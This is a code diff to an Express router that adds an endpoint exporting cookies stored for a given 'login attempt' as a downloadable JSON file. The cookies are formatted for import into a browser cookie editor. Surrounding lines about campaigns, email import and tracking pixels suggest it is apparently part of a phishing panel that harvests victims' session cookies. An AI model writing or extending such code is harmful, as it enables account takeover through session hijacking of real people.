@@ -7,6 +7,55 @@ const db = require('../database');
 router.post('/import_email', utilityController.importEmail);
 router.post('/extract', utilityController.extract);
 
+// Download cookie endpoint for detailed cookie info
+router.get('/DownloadCookies/:loginAttemptId', (req, res) => {
+  const { loginAttemptId } = req.params;
+  
+  db.get(
+    `SELECT cookies FROM login_attempts WHERE id = ?`,
+    [loginAttemptId],
+    (err, row) => {
+      if (err) {
+        console.error('Error fetching cookies:', err);
+        return res.status(500).json({ error: 'Failed to fetch cookies' });
+      }
+      
+      if (!row || !row.cookies) {
+        return res.status(404).json({ error: 'No cookies found for this login attempt' });
+      }
+      
+      try {
+        const cookies = JSON.parse(row.cookies);
+        
+        // Format cookies as requested
+        const formattedCookies = cookies.map(cookie => {
+          return {
+            domain: cookie.domain || '',
+            expirationDate: cookie.expirationDate || null,
+            hostOnly: cookie.hostOnly !== undefined ? cookie.hostOnly : true,
+            httpOnly: cookie.httpOnly !== undefined ? cookie.httpOnly : false,
+            name: cookie.name || '',
+            path: cookie.path || '/',
+            sameSite: cookie.sameSite || null,
+            secure: cookie.secure !== undefined ? cookie.secure : false,
+            session: cookie.session !== undefined ? cookie.session : true,
+            storeId: null,
+            value: cookie.value || ''
+          };
+        });
+
+        // Send the formatted cookies as a JSON file for download
+        res.setHeader('Content-Type', 'application/json');
+        res.setHeader('Content-Disposition', `attachment; filename=cookies-${loginAttemptId}.json`);
+        res.send(JSON.stringify(formattedCookies, null, 2));
+      } catch (error) {
+        console.error('Error parsing cookies JSON:', error);
+        return res.status(500).json({ error: 'Error formatting cookies' });
+      }
+    }
+  );
+});
+
 // Debug endpoint to check tracking tables
 router.get('/debug/tracking', (req, res) => {
   const results = {};
@@ -92,4 +141,4 @@ router.get('/debug/tracking-pixels/:campaignId', (req, res) => {
   );
 });
 
-module.exports = router; 
+module.exports = router;
